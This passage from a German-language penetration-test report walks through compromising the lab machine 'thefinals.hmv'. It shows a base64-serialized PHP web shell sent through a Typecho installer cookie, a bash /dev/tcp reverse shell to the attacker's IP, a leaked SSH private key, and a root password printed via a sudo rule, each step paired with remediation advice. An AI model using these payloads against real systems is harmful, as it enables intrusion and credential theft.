+└─# <span class="command">PAYLOAD=$(echo -n 'a:1:{s:6:"prefix";s:35:"@eval($POST[\"cmd\"]);";}' | base64)</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich erstellte einen Base64-kodierten String, der eine serialisierte PHP-Struktur enthielt. Diese Struktur enthielt den PHP-Code einer einfachen Web-Shell: `@eval($POST["cmd"]);`. 
+Dieser Code erlaubte die Ausführung beliebiger Systembefehle über den `cmd` Parameter einer HTTP POST Anfrage.
+            </p>
+             <p class="analysis">
+                2. Ausnutzung des Typecho RCE Exploits über die Installationsseite:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">POST http://thefinals.hmv/blog/install/Mysql.php mit Cookie typecho_config=[Base64-Payload] und leerem POST-Body</span>
+<span class="command">dann: curl "http://thefinals.hmv/blog/install/Mysql.php?cmd=id"</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich sendete eine speziell präparierte HTTP POST-Anfrage an die Datei `/blog/install/Mysql.php` auf dem Zielsystem. Diese Anfrage enthielt im Cookie "typecho_config" den zuvor generierten
+ Base64-kodierten Payload. Da die Installation nicht abgeschlossen war, verarbeitete die Datei `Mysql.php` den Inhalt des Cookies, deserialisierte die PHP-Struktur und führte den darin enthaltenen
+ schädlichen PHP-Code aus. Dies platzierte effektiv eine Web-Shell in der Datei `Mysql.php` selbst. Ein anschließender Aufruf der URL mit dem Parameter `?cmd=id` demonstrierte die erfolgreiche 
+Befehlsausführung, indem die Ausgabe des `id`-Befehls angezeigt wurde (was bestätigte, dass die Shell unter dem Benutzer `apache` lief).
+            </p>
+             <p class="analysis">
+                3. Erhalt einer stabilen Reverse Shell als `apache`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 443</span></div>
+                    <pre><span class="password">listening on [any] 443 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.64] 38631</span>
+<span class="prompt">/var/www/html/blog/usr/themes/default $</span> <span class="command">id</span>
+<span class="command">uid=102(apache) gid=103(apache) groups=82(www-data),103(apache),103(apache)</span>
+<span class="command">usw.</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Um eine interaktive Shell zu erhalten, startete ich einen Netcat-Listener auf meiner Kali-Maschine auf Port 443. Über die kompromittierte Web-Shell in `Mysql.php` injizierte ich einen Befehl
+ (z.B. `bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'`), der eine Reverse Shell zum Listener auf Port 443 initiierte. Ich erhielt erfolgreich eine Shell mit den Berechtigungen des Webserver-Benutzers 
+`apache`. Fantastisch der zugriff als apache war erfolgreich nun haben wir unser Ziel erreicht.
+            </p>
+
+             <p class="analysis">
+                <strong>Erwartetes Ergebnis:</strong> Erlangung von Remote Code Execution als Webserver-Benutzer (`apache` oder `www-data`) und Etablierung einer interaktiven Shell-Sitzung.
+            </p>
+             <p class="analysis">
+                <strong>Tatsächliches Ergebnis:</strong> Eine Web-Shell wurde erfolgreich in `Mysql.php` platziert und eine interaktive Reverse Shell als Benutzer `apache` auf Port 443 erlangt.
+            </p>
+
+            <p class="analysis">
+                <strong>Risikobewertung:</strong>
+                <br><strong>Auswirkung:</strong> Kritisch. Remote Code Execution ermöglichte die vollständige Kompromittierung des Webservers unter den Berechtigungen des `apache`-Benutzers. Dies kann 
+zur Offenlegung von Daten, Manipulation der Website und Nutzung des Servers als Ausgangspunkt für weitere Angriffe führen.
+                <br><strong>Wahrscheinlichkeit:</strong> Hoch. Die Schwachstelle ist ein bekannter Exploit in einer bestimmten Version der Software und war direkt ausnutzbar, da die Installationsdateien
+ nicht entfernt wurden.
+                <br><strong>Gesamtrisiko:</strong> Kritisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen:</strong>
+                <br><strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li><strong>Dringend:</strong> Stellen Sie sicher, dass das Installationsverzeichnis (`/blog/install/`) und alle Installationsdateien (`Mysql.php`, `SQLite.php` etc.) sofort nach der 
+Installation vollständig entfernt werden oder der Zugriff darauf streng gesperrt wird.</li>
+                    <li>Halten Sie die Typecho-Installation auf der neuesten, gepatchten Version.</li>
+                    <li>Implementieren Sie eine Web Application Firewall (WAF), die Anfragen an Installationspfade und bekannte Exploit-Signaturen blockiert.</li>
+                    <li>Überwachen Sie den Webserver auf ungewöhnliche Dateierstellungs- oder Schreibaktivitäten in Webverzeichnissen.</li>
+                    <li>Implementieren Sie strikte Egress-Filter, um zu verhindern, dass der Webserver-Prozess Reverse Shells initiieren kann.</li>
+                </ul>
+            </p>
+        </section>        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich Zugriff als Benutzer `apache` erlangt hatte, konzentrierte ich mich auf die Privilegieneskalation zum Benutzer `scotty`, da ich durch die Logdateien Hinweise auf seine Existenz und Aktivität auf Port 1337 erhalten hatte. Ich musste einen Weg finden, um von den begrenzten Berechtigungen des `apache` Benutzers zu `scotty` zu gelangen. Eine Standardmethode ist die Suche nach unsicheren Dateien, SUID-Binaries, Cronjobs oder Passwörtern im Dateisystem oder in Konfigurationsdateien.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Benutzer `scotty` war das nächste logische Ziel für die Privilegieneskalation. Die Erkenntnis, dass er einen Dienst auf Port 1337 betrieb, war ein starker Hinweis auf einen potenziellen Vektor. Die Enumeration des Dateisystems und der Prozesse als `apache` war notwendig, um weitere Informationen zu sammeln, die zu `scotty` führen könnten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie eine gründliche Enumeration des Systems durch, sobald Sie eine Shell erhalten haben. Suchen Sie gezielt nach Hinweisen auf andere Benutzer, laufende Dienste, ungewöhnliche Dateiberechtigungen, SUID-Binaries oder Passwörter, die in Dateien gespeichert sind.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig Dateiberechtigungen und stellen Sie sicher, dass sensible Dateien oder Verzeichnisse nicht für andere Benutzer les- oder schreibbar sind. Minimieren Sie die Anzahl der Benutzerkonten und Dienste auf einem System.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">nc -ulnvp 1337</span></div>
+                    <pre><span class="command">listening on [::]:1337 ...</span>
+<span class="password">connect to [::ffff:192.168.2.64]:1337 from [::ffff:192.168.2.64]:56097 ([::ffff:192.168.2.64]:56097)</span>
+<span class="password">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQ</span>
+<span class="password">kc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXN</span>
+<span class="password">mYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQ</span>
+<span class="password">UFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEh</span>
+<span class="password">pRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQ</span>
+<span class="password">UFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Die Logdateien des Benutzers `scotty` deuteten auf Aktivität auf UDP Port 1337 hin. Ich beschloss, diesen Dienst genauer zu untersuchen. Ich startete einen Netcat-Listener auf der Ziel-VM selbst, der auf UDP Port 1337 lauschte. Ich verwendete den Befehl `nc -ulnvp 1337` (u für UDP, l für listen, n für numeric, v für verbose, p für port). Unmittelbar nach dem Start des Listeners erhielt ich eine eingehende Verbindung vom Zielsystem selbst (`192.168.2.64`) auf Port 1337 und empfing eine lange, Base64-kodierte Zeichenkette.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der lauschende UDP-Dienst auf Port 1337, der beim Start meines Listeners automatisch einen Base64-String sendete, war ein klarer Hinweis auf einen Intent. Dies bestätigte, dass ein Prozess im Hintergrund aktiv war und auf diesem Port kommunizierte. Der empfangene Base64-String musste nun dekodiert werden, um seinen Inhalt zu verstehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie Logeinträge oder Scan-Ergebnisse finden, die auf lokale Dienste oder ungewöhnliche Ports hinweisen, untersuchen Sie diese genauer. Starten Sie Listener oder versuchen Sie, sich mit dem Dienst zu verbinden, um die Kommunikation zu sehen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie lokale Netzwerkaktivitäten und die Kommunikation zwischen Prozessen. Stellen Sie sicher, dass lokal lauschende Dienste nur die notwendigen Daten preisgeben und keine sensitiven Informationen (wie private Schlüssel) unverschlüsselt senden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/var/www/html/blog $ <span class="command">cd /tmp/</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/tmp $ <span class="command">echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQ
+kc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMXduMDk0cGhPcXN
+mYm8rbzNDQllpTjN4QTE2eW1LU2JYMlVZMzJ4L0FFd0FBQUpnRGMvWVVBM1AyCkZBQUFBQXR6YzJndFpXUXlOVFV4T1FBQ
+UFDQTF3bjA5NHBoT3FzZmJvK28zQ0JZaU4zeEExNnltS1NiWDJVWTMyeC9BRXcKQUFBRUN2N2tmZW9YT1FDaTVDUklXZEh
+pRFQ1dXBLeVkzdlF4QWxLbXhFUXpSWkxEWENmVDNpbUU2cXg5dWo2amNJRmlJMwpmRURYcktZcEp0ZlpSamZiSDhBVEFBQ
+UFFbkp2YjNSQWRHaGxabWx1WVd4ekxtaHRkZ0VDQXc9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K" | base64 -d > scotty_key</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/tmp $ <span class="command">chmod 600 scotty_key</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich wechselte in das `/tmp` Verzeichnis, um temporär mit der dekodierten Datei zu arbeiten. Ich nahm den Base64-String, den ich auf Port 1337 empfangen hatte, dekodierte ihn mit `base64 -d` und speicherte das Ergebnis in einer Datei namens `scotty_key`. Der Befehl war `echo "..." | base64 -d > scotty_key`. Anschließend setzte ich die Berechtigungen der Datei `scotty_key` auf `600` (`chmod 600 scotty_key`), was bedeutet, dass nur der Eigentümer (ich als `apache`) die Datei lesen und schreiben kann, was für private SSH-Schlüssel erforderlich ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der dekodierte Inhalt war eindeutig ein SSH PRIVATE KEY (`-----BEGIN OPENSSH PRIVATE KEY-----`). Dies ist ein kritischer Fund! Der Dienst auf Port 1337 sendete den privaten SSH-Schlüssel des Benutzers `scotty` im Klartext (Base64-kodiert ist immer noch Klartext) an jeden, der auf dem Port lauschte. Die Fähigkeit, diesen Schlüssel zu empfangen, ermöglicht mir nun, mich direkt per SSH als Benutzer `scotty` anzumelden, ohne ein Passwort zu benötigen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dekodieren Sie alle verdächtigen Base64-Strings, die Sie finden. Überprüfen Sie heruntergeladene Dateien oder empfangene Daten auf geheime Schlüssel oder Zugangsdaten. Setzen Sie die korrekten Berechtigungen für private Schlüssel, bevor Sie versuchen, sie zu verwenden.
+                <br><strong>Empfehlung (Admin):</strong> Speichern oder senden Sie niemals private Schlüssel in Klartext (oder Base64-kodiert) über das Netzwerk. Implementieren Sie sichere Methoden zur Verteilung von Schlüsseln. Überwachen Sie den Netzwerkverkehr auf ungewöhnliche Datenübertragungen, insbesondere von Systemprozessen. Stellen Sie sicher, dass Dienste keine sensiblen Daten an beliebige Listener senden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/tmp $ <span class="command">ssh -i scotty_key scotty@thefinals.hmv</span></div>
+                    <pre><span class="command">The authenticity of host 'thefinals.hmv (127.0.0.1)' can't be established.</span>
+<span class="command">ED25519 key fingerprint is SHA256:EzmhY2U9+FvurEu825jyirPaiFVcHNA2joTW03K3glk.</span>
+<span class="command">This key is not known by any other names.</span>
+<span class="command">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="command">Could not create directory '/var/www/.ssh' (Permission denied).</span>
+<span class="command">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span>
+
+<span class="prompt">thefinals:~$</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">thefinals:~$ <span class="command">id</span></div>
+                    <pre><span class="command">uid=1002(scotty) gid=100(users) groups=100(users),100(users)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit dem gefundenen privaten SSH-Schlüssel versuchte ich, mich per SSH als Benutzer `scotty` anzumelden. Ich verwendete den Befehl `ssh -i scotty_key scotty@thefinals.hmv`. Der Parameter `-i scotty_key` wies SSH an, den gefundenen privaten Schlüssel zu verwenden. Da ich den SSH-Schlüssel besaß, benötigte ich kein Passwort. Nach der Bestätigung der Host-Authentizität erhielt ich erfolgreich eine SSH-Shell. Die Eingabeaufforderung `thefinals:~$` und der anschließende `id`-Befehl (`uid=1002(scotty) ...`) bestätigten, dass ich nun als Benutzer `scotty` auf dem System angemeldet war. Die Fehlermeldungen bezüglich der `.ssh` Verzeichnisse von `/var/www/` waren erwartbar und zeigten, dass der `apache` Benutzer keine Schreibrechte dort hatte, was in diesem Kontext aber irrelevant war, da ich mich ja als `scotty` anmeldete.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Ich habe die Privilegieneskalation von `apache` zu `scotty` durch den missbräuchlichen Einsatz des UDP-Dienstes und die Nutzung des offengelegten privaten SSH-Schlüssels erreicht. Ich habe nun Zugriff als ein anderer regulärer Benutzer, der wahrscheinlich höhere Berechtigungen als `apache` hat und das nächste Ziel vor `root` darstellt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie gefundene private Schlüssel sofort, um sich als der entsprechende Benutzer per SSH anzumelden. SSH-Zugriff ist oft stabiler und interaktiver als Web-Shells.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, welche Dienste private Schlüssel handhaben und stellen Sie sicher, dass diese Schlüssel sicher gespeichert und niemals unverschlüsselt übermittelt werden. Implementieren Sie Multi-Faktor-Authentifizierung für SSH-Zugriffe.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">thefinals:~$ <span class="command">sudo -l</span></div>
+                    <pre><span class="command">Matching Defaults entries for scotty on thefinals:</span>
+<span class="command">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">Runas and Command-specific defaults for scotty:</span>
+<span class="command">    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"</span>
+
+<span class="command">User scotty may run the following commands on thefinals:</span>
+<span class="password">    (ALL) NOPASSWD: /sbin/secret</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `scotty` prüfte ich sofort meine `sudo`-Berechtigungen mit dem Befehl `sudo -l`. Die Ausgabe zeigte eine sehr interessante Regel: `(ALL) NOPASSWD: /sbin/secret`. Dies bedeutete, dass der Benutzer `scotty` das Programm `/sbin/secret` als *jeder* Benutzer (`ALL`), einschließlich `root`, ausführen darf, ohne ein Passwort einzugeben (`NOPASSWD`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist der direkte Weg zur Root-Privilegieneskalation! Eine `NOPASSWD` Regel für ein Programm namens `/sbin/secret` ist ein sehr starker Hinweis auf eine beabsichtigte Schwachstelle. Ich darf dieses Programm mit Root-Berechtigungen ausführen, ohne ein Passwort zu benötigen. Der nächste Schritt war, zu untersuchen, was `/sbin/secret` tut, wenn es mit Root-Berechtigungen ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die `sudo`-Berechtigungen für jeden neuen Benutzer, den Sie kompromittieren. `NOPASSWD`-Einträge für ungewöhnliche Programme sind sehr vielversprechend.
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie `NOPASSWD` Berechtigungen nur mit äußerster Vorsicht und nur für absolut notwendige und sichere Befehle zu. Benennen Sie sensible Skripte oder Programme nicht mit offensichtlichen Namen wie "secret". Auditieren Sie Ihre `sudoers`-Datei regelmäßig.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">thefinals:~$ <span class="command">for i in $(seq 1 98); do python3 -c 'import pty; pty.spawn("/bin/ash")' & done</span></div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuchte, die Shell zu stabilisieren und die Interaktivität zu verbessern, insbesondere für den Fall, dass die Ausführung von `/sbin/secret` eine neue Shell eröffnen würde. Ich verwendete eine Schleife, um mehrere nicht-interaktive `/bin/ash` Shells im Hintergrund zu starten, was manchmal helfen kann, wenn die Haupt-Shell instabil ist.
+            </p>
+            <p class="evaluation"> 
+                <strong>Bewertung:</strong> Das Starten von "Zombie"-Shells kann in einigen Szenarien helfen, eine stabilere interaktive Shell zu erhalten, obwohl dies keine universelle Lösung ist. Es war ein Versuch, die Umgebung für die Ausführung von `/sbin/secret` vorzubereiten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie verschiedene Methoden zur Shell-Stabilisierung (`stty`, `python -c 'import pty'`, `rlwrap`, das Starten von Hintergrund-Shells). Finden Sie heraus, welche Methode auf dem Zielsystem am besten funktioniert.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ungewöhnliche Prozessaktivitäten, wie z.B. eine große Anzahl von Hintergrund-Shell-Prozessen, die von einem einzelnen Benutzer gestartet werden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal"> 
+                    <div class="prompt">thefinals:~$ <span class="command">sudo /sbin/secret</span></div>
+                    <pre><span class="password">root:p8RuoQGTtlKLAjuF1Tpy5wX</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte das Programm `/sbin/secret` mit Root-Berechtigungen aus, indem ich `sudo /sbin/secret` verwendete. Wie durch die `sudo -l` Ausgabe bestätigt, war hierfür kein Passwort erforderlich. Die Ausgabe des Befehls war eine einzelne Zeile: `root:p8RuoQGTtlKLAjuF1Tpy5wX`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Das Programm `/sbin/secret` gab die Zugangsdaten für den Benutzer `root` aus: Benutzername `root` und Passwort `p8RuoQGTtlKLAjuF1Tpy5wX`. Dies ist der entscheidende Fund für die vollständige Kompromittierung des Systems. Das Programm war offensichtlich dazu gedacht, diese Information preiszugeben, wenn es mit erhöhten Rechten ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie ein Programm finden, das Sie mit `sudo` ausführen dürfen, und sein Zweck unklar ist, führen Sie es mit den erlaubten Berechtigungen aus und analysieren Sie die Ausgabe genau. Achten Sie auf Passwörter, Schlüssel oder andere sensible Daten.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten in ausführbaren Skripten oder Binaries. Wenn ein Skript erhöhte Rechte benötigt, implementieren Sie es sicher und stellen Sie sicher, dass es keine unbeabsichtigten Informationen preisgibt. Vermeiden Sie `NOPASSWD` Einträge für solche Skripte.
+            </p>
+
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die erfolgreiche Erlangung vollständiger Root-Privilegien auf dem Zielsystem durch die Ausnutzung einer Fehlkonfiguration in der `sudoers`-Datei. Der Benutzer `scotty` war berechtigt, das Programm `/sbin/secret` ohne Passwort als Root auszuführen. Die Ausführung dieses Programms gab das Root-Passwort preis, was den direkten Login als Root ermöglichte.
+            </p>
+             <p class="analysis">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff als Benutzer `scotty`.</li>
+                    <li>Die `sudoers`-Datei muss den Eintrag `scotty ALL=(ALL) NOPASSWD: /sbin/secret` enthalten.</li>
+                    <li>Das Programm `/sbin/secret` muss auf dem System existieren und bei Ausführung als Root das Root-Passwort ausgeben.</li>
+                </ul>
+            </p>
+             <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung & Beweismittel:</strong>
+            </p>
+             <p class="analysis">
+                1. Überprüfung der `sudo`-Berechtigungen des Benutzers `scotty`:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">thefinals:~$ <span class="command">sudo -l</span></div>
+                    <pre><span class="command">...</span>
+<span class="command">User scotty may run the following commands on thefinals:</span>
+<span class="password">    (ALL) NOPASSWD: /sbin/secret</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Als Benutzer `scotty` habe ich meine `sudo`-Berechtigungen geprüft und festgestellt, dass ich `/sbin/secret` ohne Passwort als Root ausführen darf.
+            </p>
+             <p class="analysis">
+                2. Ausführung von `/sbin/secret` mit Root-Berechtigungen:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">thefinals:~$ <span class="command">sudo /sbin/secret</span></div>
+                    <pre><span class="password">root:p8RuoQGTtlKLAjuF1Tpy5wX</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich führte das Programm `/sbin/secret` unter Verwendung meiner `sudo`-Berechtigung aus. Die Ausgabe war das Passwort für den Root-Benutzer.
+            </p>
+             <p class="analysis">
+                3. Login als Root und Verifizierung:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">/home/scotty # <span class="command">id</span></div>
+                    <pre><span class="command">uid=0(root) gid=0(root) groups=0(root)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Mit dem gefundenen Root-Passwort konnte ich mich direkt als Root anmelden (z.B. über `su root` mit dem Passwort oder direkt per SSH, wenn Root-Login erlaubt wäre). Innerhalb der Root-Shell habe ich meine Identität mit `id` verifiziert, was die Benutzer-ID `0(root)` bestätigte. Fantastisch der root zugriff war erfolgreich nun haben wir unser Ziel erreicht.
+            </p>
+             <p class="analysis">
+                <strong>Erwartetes Ergebnis:</strong> Erlangung vollständiger Root-Privilegien auf dem Zielsystem.
+            </p>
+             <p class="analysis">
+                <strong>Tatsächliches Ergebnis:</strong> Das Root-Passwort wurde durch die Ausnutzung der `sudo`-Fehlkonfiguration erhalten, was den direkten Login als Root ermöglichte. Das System wurde vollständig kompromittiert.
+            </p>
+
+            <p class="analysis">
+                <strong>Risikobewertung:</strong>
+                <br><strong>Auswirkung:</strong> Kritisch. Ein unprivilegierter Benutzer (`scotty`) konnte durch einen einfachen `sudo`-Befehl vollständige administrative Kontrolle über das System erlangen. Dies ermöglicht unbefugten Zugriff auf alle Daten, die Installation von Backdoors, die Manipulation von Systemkonfigurationen und die Nutzung des Systems für weitere Angriffe.
+                <br><strong>Wahrscheinlichkeit:</strong> Hoch. Die Schwachstelle ist direkt über einen vorhandenen `sudo`-Eintrag ausnutzbar und erfordert nur die Ausführung eines einzigen Befehls.
+                <br><strong>Gesamtrisiko:</strong> Kritisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen:</strong>
+                <br><strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li><strong>Dringend:</strong> Entfernen Sie den `NOPASSWD`-Eintrag für `/sbin/secret` aus der `sudoers`-Datei.</li>
+                    <li>Speichern Sie niemals Passwörter oder andere sensible Daten in ausführbaren Skripten oder Binaries, insbesondere nicht in solchen, die mit erhöhten Rechten ausgeführt werden können.</li>
+                    <li>Überprüfen Sie alle `sudoers`-Einträge auf ähnliche Fehlkonfigurationen und wenden Sie das Prinzip der minimalen Rechte strikt an.</li>
+                    <li>Führen Sie regelmäßige Audits Ihrer `sudoers`-Konfiguration und des Dateisystems durch.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/june/user.flag</div>
+                    <div class="flag-value"><span class="password">flag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/r00t.txt</div>
+                    <div class="flag-value"><span class="password">flag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 26. Juni 2025</p>
+    </footer>
+</body>
+</html>
+			 
